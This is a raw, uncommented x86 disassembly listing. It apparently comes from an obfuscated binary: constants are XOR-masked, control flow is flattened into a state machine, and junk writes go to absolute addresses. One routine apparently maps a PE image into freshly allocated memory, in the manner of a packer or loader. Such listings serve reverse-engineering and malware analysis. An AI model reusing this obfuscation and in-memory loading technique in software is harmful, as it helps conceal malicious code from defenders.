  4285b7:	sub    eax,0xc
  4285ba:	mov    DWORD PTR [ebp-0x28],eax
  4285bd:	mov    eax,DWORD PTR [ebp+0x10]
  4285c0:	mov    eax,DWORD PTR [eax+0x38]
  4285c3:	mov    ecx,DWORD PTR [ebp+0x10]
  4285c6:	dec    eax
  4285c7:	test   DWORD PTR [ecx+0x54],eax
  4285ca:	mov    eax,DWORD PTR [ebp+0x10]
  4285cd:	je     0x4285e7
  4285cf:	mov    eax,DWORD PTR [eax+0x38]
  4285d2:	mov    ecx,DWORD PTR [ebp+0x10]
  4285d5:	mov    ecx,DWORD PTR [ecx+0x54]
  4285d8:	dec    eax
  4285d9:	not    eax
  4285db:	and    ecx,eax
  4285dd:	mov    eax,DWORD PTR [ebp+0x10]
  4285e0:	mov    eax,DWORD PTR [eax+0x38]
  4285e3:	add    eax,ecx
  4285e5:	jmp    0x4285ea
  4285e7:	mov    eax,DWORD PTR [eax+0x54]
  4285ea:	mov    DWORD PTR [ebp+0x1c],eax
  4285ed:	mov    eax,DWORD PTR [ebp+0x8]
  4285f0:	xor    eax,edi
  4285f2:	add    eax,ebx
  4285f4:	mov    DWORD PTR [ebp+0x18],eax
  4285f7:	mov    eax,DWORD PTR [ebp+0x8]
  4285fa:	xor    eax,edi
  4285fc:	add    eax,ebx
  4285fe:	mov    DWORD PTR [ebp+0x18],eax
  428601:	mov    eax,DWORD PTR [ebp+0x8]
  428604:	mov    ecx,DWORD PTR [ebp-0x24]
  428607:	xor    eax,edi
  428609:	add    eax,ebx
  42860b:	mov    DWORD PTR [ecx],eax
  42860d:	mov    DWORD PTR [ebp+0x18],edx
  428610:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  428617:	mov    DWORD PTR [ebp+0x18],0xf89c85b8
  42861e:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  428625:	mov    eax,DWORD PTR [ebp-0x8]
  428628:	mov    ecx,DWORD PTR [ebp+0x1c]
  42862b:	xor    eax,edi
  42862d:	add    eax,ebx
  42862f:	imul   eax,ecx
  428632:	mov    ecx,DWORD PTR [ebp+0x8]
  428635:	mov    edx,DWORD PTR [ebp-0x28]
  428638:	xor    ecx,edi
  42863a:	lea    ecx,[ecx+edx*1+0x3272f1]
  428641:	cmp    eax,ecx
  428643:	jae    0x4289f4
  428649:	mov    eax,DWORD PTR [ebp+0x8]
  42864c:	xor    eax,edi
  42864e:	add    eax,ebx
  428650:	mov    DWORD PTR [ebp+0x18],eax
  428653:	mov    eax,DWORD PTR [ebp+0x1c]
  428656:	add    eax,DWORD PTR [ebp-0x1c]
  428659:	mov    DWORD PTR [ebp-0x4],eax
  42865c:	push   DWORD PTR [ebp-0x4]
  42865f:	mov    esi,DWORD PTR [ebp-0x1c]
  428662:	mov    ecx,DWORD PTR [ebp+0x10]
  428665:	call   0x4277b9
  42866a:	mov    DWORD PTR [ebp+0xc],eax
  42866d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  428674:	mov    eax,DWORD PTR [ebp-0x18]
  428677:	xor    eax,edi
  428679:	lea    ecx,[ebp-0x40]
  42867c:	add    eax,ebx
  42867e:	push   ecx
  42867f:	call   0x427d4b
  428684:	mov    eax,DWORD PTR [ebp+0xc]
  428687:	test   eax,eax
  428689:	je     0x4286d9
  42868b:	mov    eax,DWORD PTR [ebp-0x18]
  42868e:	xor    eax,edi
  428690:	add    eax,ebx
  428692:	push   eax
  428693:	push   DWORD PTR [ebp+0xc]
  428696:	lea    eax,[ebp-0x40]
  428699:	push   eax
  42869a:	call   0x427c41
  42869f:	mov    eax,DWORD PTR [ebp-0x4]
  4286a2:	mov    DWORD PTR [ebp-0x18],eax
  4286a5:	mov    eax,DWORD PTR [ebp-0x18]
  4286a8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4286ab:	sub    eax,ecx
  4286ad:	mov    DWORD PTR [ebp-0x18],eax
  4286b0:	mov    eax,DWORD PTR [ebp+0xc]
  4286b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4286b6:	mov    eax,DWORD PTR [eax+0x10]
  4286b9:	add    eax,DWORD PTR [ecx+0xc]
  4286bc:	mov    ecx,DWORD PTR [ebp-0x18]
  4286bf:	cmp    ecx,eax
  4286c1:	jb     0x4286d9
  4286c3:	mov    eax,DWORD PTR [ebp+0xc]
  4286c6:	mov    eax,DWORD PTR [eax+0xc]
  4286c9:	mov    ecx,DWORD PTR [ebp+0xc]
  4286cc:	add    eax,DWORD PTR [ecx+0x8]
  4286cf:	mov    ecx,DWORD PTR [ebp-0x18]
  4286d2:	sub    eax,ecx
  4286d4:	jmp    0x4289c7
  4286d9:	push   0xc
  4286db:	push   DWORD PTR [ebp-0x4]
  4286de:	lea    eax,[ebp-0x4c]
  4286e1:	push   eax
  4286e2:	call   0x427c41
  4286e7:	mov    eax,0xf89c85a5
  4286ec:	mov    DWORD PTR [ebp-0x2c],eax
  4286ef:	mov    DWORD PTR [ebp-0x30],0xf89c85ba
  4286f6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  4286fd:	mov    DWORD PTR [ebp-0x38],0xf89c85b8
  428704:	lea    ecx,[ebp-0x2c]
  428707:	mov    DWORD PTR [ebp-0xc],ecx
  42870a:	lea    ecx,[ebp-0x30]
  42870d:	mov    DWORD PTR [ebp-0x10],ecx
  428710:	lea    ecx,[ebp-0x34]
  428713:	mov    DWORD PTR [ebp+0xc],ecx
  428716:	lea    ecx,[ebp-0x38]
  428719:	mov    DWORD PTR [ebp-0x14],ecx
  42871c:	mov    ecx,DWORD PTR [ebp+0x8]
  42871f:	xor    ecx,edi
  428721:	add    ecx,ebx
  428723:	mov    DWORD PTR [ebp-0x18],ecx
  428726:	jmp    0x428922
  42872b:	cmp    eax,0xf89c85bb
  428730:	je     0x428934
  428736:	mov    ecx,DWORD PTR [ebp-0x8]
  428739:	xor    ecx,edi
  42873b:	mov    esi,eax
  42873d:	add    ecx,ebx
  42873f:	mov    DWORD PTR [ebp+0x18],ecx
  428742:	mov    eax,DWORD PTR [ebp-0x18]
  428745:	xor    esi,edi
  428747:	lea    eax,[eax+esi*1+0x3272f1]
  42874e:	mov    DWORD PTR [ebp-0x18],eax
  428751:	mov    eax,DWORD PTR [ebp-0x8]
  428754:	mov    ecx,DWORD PTR [ebp-0x18]
  428757:	xor    eax,edi
  428759:	add    eax,ebx
  42875b:	cmp    ecx,eax
  42875d:	jne    0x428772
  42875f:	mov    eax,DWORD PTR [ebp+0x8]
  428762:	xor    eax,edi
  428764:	add    eax,ebx
  428766:	push   eax
  428767:	push   0xc
  428769:	lea    eax,[ebp-0x4c]
  42876c:	push   eax
  42876d:	call   0x428226
  428772:	mov    eax,DWORD PTR [ebp-0xc]
  428775:	mov    eax,DWORD PTR [eax]
  428777:	xor    eax,edi
  428779:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428780:	mov    ecx,DWORD PTR [ebp+0x8]
  428783:	xor    ecx,edi
  428785:	movzx  eax,al
  428788:	add    ecx,ebx
  42878a:	cmp    eax,ecx
  42878c:	je     0x42890a
  428792:	mov    eax,DWORD PTR [ebp-0x10]
  428795:	mov    eax,DWORD PTR [eax]
  428797:	xor    eax,edi
  428799:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4287a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4287a3:	xor    ecx,edi
  4287a5:	movzx  eax,al
  4287a8:	add    ecx,ebx
  4287aa:	cmp    eax,ecx
  4287ac:	je     0x42890a
  4287b2:	mov    eax,DWORD PTR [ebp+0xc]
  4287b5:	mov    eax,DWORD PTR [eax]
  4287b7:	xor    eax,edi
  4287b9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4287c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4287c3:	xor    ecx,edi
  4287c5:	movzx  eax,al
  4287c8:	add    ecx,ebx
  4287ca:	cmp    eax,ecx
  4287cc:	je     0x42890a
  4287d2:	mov    eax,DWORD PTR [ebp-0x14]
  4287d5:	mov    eax,DWORD PTR [eax]
  4287d7:	xor    eax,edi
  4287d9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4287e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4287e3:	xor    ecx,edi
  4287e5:	movzx  eax,al
  4287e8:	add    ecx,ebx
  4287ea:	cmp    eax,ecx
  4287ec:	je     0x42890a
  4287f2:	mov    eax,DWORD PTR [ebp-0x10]
  4287f5:	mov    eax,DWORD PTR [eax]
  4287f7:	xor    eax,edi
  4287f9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428800:	mov    ecx,DWORD PTR [ebp-0xc]
  428803:	mov    ecx,DWORD PTR [ecx]
  428805:	xor    ecx,edi
  428807:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  42880e:	xor    al,cl
  428810:	mov    ecx,DWORD PTR [ebp+0xc]
  428813:	mov    ecx,DWORD PTR [ecx]
  428815:	xor    ecx,edi
  428817:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  42881e:	or     al,cl
  428820:	mov    ecx,DWORD PTR [ebp-0xc]
  428823:	mov    ecx,DWORD PTR [ecx]
  428825:	xor    ecx,edi
  428827:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  42882e:	cmp    cl,al
  428830:	jne    0x42890a
  428836:	mov    eax,DWORD PTR [ebp+0xc]
  428839:	mov    eax,DWORD PTR [eax]
  42883b:	xor    eax,edi
  42883d:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428844:	mov    ecx,DWORD PTR [ebp-0x10]
  428847:	mov    ecx,DWORD PTR [ecx]
  428849:	xor    ecx,edi
  42884b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428852:	xor    al,cl
  428854:	mov    ecx,DWORD PTR [ebp-0x14]
  428857:	mov    ecx,DWORD PTR [ecx]
  428859:	xor    ecx,edi
  42885b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428862:	or     al,cl
  428864:	mov    ecx,DWORD PTR [ebp-0x10]
  428867:	mov    ecx,DWORD PTR [ecx]
  428869:	xor    ecx,edi
  42886b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428872:	cmp    cl,al
  428874:	jne    0x42890a
  42887a:	mov    eax,DWORD PTR [ebp-0x14]
  42887d:	mov    eax,DWORD PTR [eax]
  42887f:	xor    eax,edi
  428881:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428888:	mov    ecx,DWORD PTR [ebp+0xc]
  42888b:	mov    ecx,DWORD PTR [ecx]
  42888d:	xor    ecx,edi
  42888f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428896:	xor    al,cl
  428898:	mov    ecx,DWORD PTR [ebp-0xc]
  42889b:	mov    ecx,DWORD PTR [ecx]
  42889d:	xor    ecx,edi
  42889f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4288a6:	or     al,cl
  4288a8:	mov    ecx,DWORD PTR [ebp+0xc]
  4288ab:	mov    ecx,DWORD PTR [ecx]
  4288ad:	xor    ecx,edi
  4288af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  4288b6:	cmp    cl,al
  4288b8:	jne    0x42890a
  4288ba:	mov    eax,DWORD PTR [ebp-0x14]
  4288bd:	mov    eax,DWORD PTR [eax]
  4288bf:	xor    eax,edi
  4288c1:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4288c8:	mov    ecx,DWORD PTR [ebp-0xc]
  4288cb:	mov    ecx,DWORD PTR [ecx]
  4288cd:	xor    ecx,edi
  4288cf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4288d6:	xor    al,cl
  4288d8:	mov    ecx,DWORD PTR [ebp-0x10]
  4288db:	mov    ecx,DWORD PTR [ecx]
  4288dd:	xor    ecx,edi
  4288df:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4288e6:	or     al,cl
  4288e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4288eb:	mov    ecx,DWORD PTR [ecx]
  4288ed:	xor    ecx,edi
  4288ef:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  4288f6:	cmp    cl,al
  4288f8:	jne    0x42890a
  4288fa:	lea    eax,[ebp-0x4c]
  4288fd:	push   eax
  4288fe:	call   0x4283c5
  428903:	mov    ecx,DWORD PTR [ebp-0x44]
  428906:	cmp    eax,ecx
  428908:	je     0x428914
  42890a:	mov    eax,DWORD PTR [ebp+0x8]
  42890d:	xor    eax,edi
  42890f:	add    eax,ebx
  428911:	mov    DWORD PTR [ebp+0x18],eax
  428914:	mov    eax,DWORD PTR [ebp-0x8]
  428917:	xor    eax,edi
  428919:	lea    eax,[eax+esi*1+0x3272f1]
  428920:	xor    eax,edi
  428922:	mov    ecx,DWORD PTR [ebp+0x8]
  428925:	mov    edx,DWORD PTR [ebp+0x18]
  428928:	xor    ecx,edi
  42892a:	add    ecx,ebx
  42892c:	cmp    edx,ecx
  42892e:	je     0x42872b
  428934:	mov    eax,DWORD PTR [ebp+0x8]
  428937:	mov    ecx,DWORD PTR [ebp+0x18]
  42893a:	xor    eax,edi
  42893c:	add    eax,ebx
  42893e:	cmp    ecx,eax
  428940:	jne    0x428953
  428942:	mov    eax,DWORD PTR [ebp-0x8]
  428945:	mov    ecx,DWORD PTR [ebp+0x1c]
  428948:	xor    eax,edi
  42894a:	lea    eax,[eax+ecx*1+0x3272f1]
  428951:	jmp    0x4289ca
  428953:	push   0x18
  428955:	push   DWORD PTR [ebp-0x4]
  428958:	lea    eax,[ebp-0x64]
  42895b:	push   eax
  42895c:	call   0x427c41
  428961:	mov    eax,DWORD PTR [ebp+0x8]
  428964:	mov    ecx,DWORD PTR [ebp-0x18]
  428967:	xor    eax,edi
  428969:	add    eax,ebx
  42896b:	cmp    eax,ecx
  42896d:	je     0x428982
  42896f:	mov    eax,DWORD PTR [ebp+0x8]
  428972:	xor    eax,edi
  428974:	add    eax,ebx
  428976:	push   eax
  428977:	push   0x18
  428979:	lea    eax,[ebp-0x64]
  42897c:	push   eax
  42897d:	call   0x428226
  428982:	mov    eax,DWORD PTR [ebp-0x4]
  428985:	add    eax,0x18
  428988:	mov    DWORD PTR [ebp+0x18],eax
  42898b:	push   DWORD PTR [ebp-0x50]
  42898e:	push   DWORD PTR [ebp+0x18]
  428991:	mov    eax,DWORD PTR [ebp-0x54]
  428994:	add    eax,DWORD PTR [ebp-0x20]
  428997:	push   eax
  428998:	call   0x427c41
  42899d:	mov    eax,DWORD PTR [ebp+0x8]
  4289a0:	mov    ecx,DWORD PTR [ebp-0x18]
  4289a3:	xor    eax,edi
  4289a5:	add    eax,ebx
  4289a7:	cmp    eax,ecx
  4289a9:	je     0x4289bc
  4289ab:	push   0x0
  4289ad:	push   DWORD PTR [ebp-0x50]
  4289b0:	mov    eax,DWORD PTR [ebp-0x54]
  4289b3:	add    eax,DWORD PTR [ebp-0x20]
  4289b6:	push   eax
  4289b7:	call   0x428226
  4289bc:	mov    eax,DWORD PTR [ebp-0x24]
  4289bf:	mov    ecx,DWORD PTR [ebp-0x50]
  4289c2:	add    DWORD PTR [eax],ecx
  4289c4:	mov    eax,DWORD PTR [ebp-0x50]
  4289c7:	add    eax,DWORD PTR [ebp+0x1c]
  4289ca:	mov    DWORD PTR [ebp+0x1c],eax
  4289cd:	mov    eax,DWORD PTR [ebp-0x8]
  4289d0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4289d3:	xor    eax,edi
  4289d5:	add    eax,ebx
  4289d7:	imul   eax,ecx
  4289da:	mov    ecx,DWORD PTR [ebp+0x8]
  4289dd:	mov    edx,DWORD PTR [ebp-0x28]
  4289e0:	xor    ecx,edi
  4289e2:	lea    ecx,[ecx+edx*1+0x3272f1]
  4289e9:	cmp    eax,ecx
  4289eb:	jb     0x428649
  4289f1:	mov    esi,DWORD PTR [ebp+0x14]
  4289f4:	mov    eax,DWORD PTR [ebp-0x20]
  4289f7:	mov    DWORD PTR [esi],eax
  4289f9:	jmp    0x428a40
  4289fb:	mov    ecx,DWORD PTR [ebp+0x8]
  4289fe:	mov    edx,DWORD PTR [ebp+0xc]
  428a01:	xor    ecx,edi
  428a03:	xor    edx,edi
  428a05:	add    ecx,ebx
  428a07:	add    edx,ebx
  428a09:	cmp    ecx,edx
  428a0b:	jne    0x428a1f
  428a0d:	mov    eax,ds:0x7f642ddc
  428a12:	imul   eax,eax,0x9f15fccf
  428a18:	mov    ds:0x7f642ddc,eax
  428a1d:	jmp    0x428a40
  428a1f:	mov    ecx,DWORD PTR [ebp+0x8]
  428a22:	xor    ecx,edi
  428a24:	add    ecx,ebx
  428a26:	cmp    eax,ecx
  428a28:	je     0x428a36
  428a2a:	sub    DWORD PTR ds:0xf861e3c,0x709beac4
  428a34:	jmp    0x428a40
  428a36:	and    DWORD PTR ds:0x3343fadc,0x5265ec3f
  428a40:	pop    edi
  428a41:	pop    esi
  428a42:	pop    ebx
  428a43:	leave  
  428a44:	ret    0x18
  428a47:	push   ebp
  428a48:	mov    ebp,esp
  428a4a:	and    esp,0xfffffff8
  428a4d:	mov    eax,DWORD PTR [ebp+0x20]
  428a50:	sub    esp,0x14
  428a53:	push   ebx
  428a54:	mov    ebx,DWORD PTR [ebp+0x14]
  428a57:	push   esi
  428a58:	push   edi
  428a59:	cmp    eax,0xf89c85a5
  428a5e:	jne    0x428a6a
  428a60:	push   0xf89c85ba
  428a65:	jmp    0x428b9c
  428a6a:	mov    eax,DWORD PTR [ebp+0x20]
  428a6d:	cmp    eax,0xf89c85ba
  428a72:	jne    0x428a7e
  428a74:	push   0xf89c85bb
  428a79:	jmp    0x428b9c
  428a7e:	mov    eax,DWORD PTR [ebp+0x20]
  428a81:	cmp    eax,0xf89c85bb
  428a86:	jne    0x428a92
  428a88:	push   0xf89c85b8
  428a8d:	jmp    0x428b9c
  428a92:	mov    eax,DWORD PTR [ebp+0x20]
  428a95:	cmp    eax,0xf89c85b8
  428a9a:	jne    0x428aa6
  428a9c:	push   0xf89c85b9
  428aa1:	jmp    0x428b9c
  428aa6:	mov    ecx,DWORD PTR [ebp+0x20]
  428aa9:	mov    eax,0xf89c85bc
  428aae:	cmp    ecx,eax
  428ab0:	jne    0x428b6c
  428ab6:	mov    eax,DWORD PTR [ebp+0x10]
  428ab9:	mov    DWORD PTR [esp+0xc],eax
  428abd:	mov    eax,DWORD PTR [ebp+0x18]
  428ac0:	mov    DWORD PTR [esp+0x14],eax
  428ac4:	mov    eax,DWORD PTR [ebp+0xc]
  428ac7:	mov    DWORD PTR [esp+0x18],eax
  428acb:	mov    eax,DWORD PTR [ebp+0x8]
  428ace:	mov    DWORD PTR [esp+0x10],eax
  428ad2:	mov    eax,DWORD PTR [esp+0x10]
  428ad6:	mov    ecx,DWORD PTR [esp+0x14]
  428ada:	mov    edi,0x75108aa
  428adf:	xor    eax,edi
  428ae1:	mov    esi,0x3272f1
  428ae6:	add    eax,esi
  428ae8:	mov    DWORD PTR [ecx],eax
  428aea:	mov    eax,DWORD PTR [esp+0xc]
  428aee:	mov    eax,DWORD PTR [eax+0x194]
  428af4:	mov    ecx,DWORD PTR [eax]
  428af6:	mov    eax,DWORD PTR [esp+0xc]
  428afa:	mov    eax,DWORD PTR [eax+0x194]
  428b00:	mov    eax,DWORD PTR [eax]
  428b02:	add    eax,DWORD PTR [ecx+0x3c]
  428b05:	mov    ecx,DWORD PTR [esp+0xc]
  428b09:	mov    ecx,DWORD PTR [ecx+0x1e0]
  428b0f:	mov    ecx,DWORD PTR [ecx+0x14]
  428b12:	push   0x4
  428b14:	push   0x3000
  428b19:	push   DWORD PTR [eax+0x50]
  428b1c:	push   0x0
  428b1e:	call   ecx
  428b20:	mov    DWORD PTR [ebx],eax
  428b22:	mov    eax,DWORD PTR [esp+0x10]
  428b26:	push   DWORD PTR [esp+0xc]
  428b2a:	xor    eax,edi
  428b2c:	add    eax,esi
  428b2e:	mov    DWORD PTR [esp+0x20],eax
  428b32:	lea    eax,[esp+0x20]
  428b36:	push   eax
  428b37:	push   ebx
  428b38:	push   DWORD PTR [esp+0x20]
  428b3c:	push   DWORD PTR [esp+0x28]
  428b40:	push   DWORD PTR [esp+0x24]
  428b44:	call   0x428509
  428b49:	mov    eax,DWORD PTR [esp+0x10]
  428b4d:	mov    ecx,DWORD PTR [ebx]
  428b4f:	xor    eax,edi
  428b51:	add    eax,esi
  428b53:	cmp    ecx,eax
  428b55:	je     0x428bb3
  428b57:	mov    eax,DWORD PTR [esp+0x18]
  428b5b:	mov    ecx,DWORD PTR [esp+0x14]
  428b5f:	xor    eax,edi
  428b61:	add    eax,esi
  428b63:	imul   eax,DWORD PTR [esp+0x1c]
  428b68:	mov    DWORD PTR [ecx],eax
  428b6a:	jmp    0x428bb3
  428b6c:	mov    ecx,DWORD PTR [ebp+0x20]
  428b6f:	cmp    ecx,0xf89c85b9
  428b75:	jne    0x428b7e
  428b77:	push   0xf89c85be
  428b7c:	jmp    0x428b9c
  428b7e:	mov    ecx,DWORD PTR [ebp+0x20]
  428b81:	cmp    ecx,0xf89c85be
  428b87:	jne    0x428b90
  428b89:	push   0xf89c85bf
  428b8e:	jmp    0x428b9c
  428b90:	mov    ecx,DWORD PTR [ebp+0x20]
  428b93:	cmp    ecx,0xf89c85bf
  428b99:	jne    0x428bb3
  428b9b:	push   eax
  428b9c:	push   DWORD PTR [ebp+0x1c]
  428b9f:	push   DWORD PTR [ebp+0x18]
  428ba2:	push   ebx
  428ba3:	push   DWORD PTR [ebp+0x10]
  428ba6:	push   DWORD PTR [ebp+0xc]
  428ba9:	push   DWORD PTR [ebp+0x8]
  428bac:	call   0x428a47
  428bb1:	mov    DWORD PTR [ebx],eax
  428bb3:	mov    eax,DWORD PTR [ebx]
  428bb5:	pop    edi
  428bb6:	pop    esi
  428bb7:	pop    ebx
  428bb8:	mov    esp,ebp
  428bba:	pop    ebp
  428bbb:	ret    0x1c
  428bbe:	push   ebp
  428bbf:	mov    ebp,esp
  428bc1:	sub    esp,0xc
  428bc4:	mov    eax,0xf89c85a5
  428bc9:	mov    DWORD PTR [ebp-0x8],eax
  428bcc:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  428bd3:	mov    ecx,DWORD PTR [ebp-0x8]
  428bd6:	xor    ecx,0x75108aa
  428bdc:	add    ecx,0x3272f1
  428be2:	mov    DWORD PTR [ebp-0x4],ecx
  428be5:	mov    ecx,DWORD PTR [ebp+0xc]
  428be8:	push   eax
  428be9:	mov    DWORD PTR [ebp+0xc],ecx
  428bec:	push   DWORD PTR [ebp+0xc]
  428bef:	lea    eax,[ebp-0x4]
  428bf2:	push   DWORD PTR [ebp+0x8]
  428bf5:	push   eax
  428bf6:	push   DWORD PTR [ebp+0xc]
  428bf9:	push   DWORD PTR [ebp-0xc]
  428bfc:	push   DWORD PTR [ebp-0x8]
  428bff:	call   0x428a47
  428c04:	mov    DWORD PTR [ebp-0x4],eax
  428c07:	mov    eax,DWORD PTR [ebp-0x4]
  428c0a:	leave  
  428c0b:	ret    0x8
